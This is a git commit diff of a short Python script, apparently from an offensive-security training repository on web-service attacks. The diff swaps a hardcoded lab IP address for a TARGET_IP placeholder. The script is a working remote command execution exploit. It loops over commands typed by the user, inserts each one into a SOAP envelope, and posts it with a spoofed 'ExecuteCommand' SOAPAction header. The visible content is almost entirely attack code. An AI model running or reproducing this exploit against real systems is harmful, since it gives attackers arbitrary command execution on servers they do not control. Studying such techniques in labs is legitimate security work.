7ced9d2dda17caea1f3c3b3b99693e48fea49eb4
sa1t <68617409+laqkracha@users.noreply.github.com>
2024-06-02 21:41:36 -0600

    Update automateSOAPspoofing.py

--- WebServices&APIattacks/automateSOAPspoofing.py
+++ WebServices&APIattacks/automateSOAPspoofing.py
@@ -3,4 +3,4 @@ import requests
 while True:
     cmd = input("$ ")
     payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
-    print(requests.post("http://10.129.213.125:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+    print(requests.post("http://TARGET_IP/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
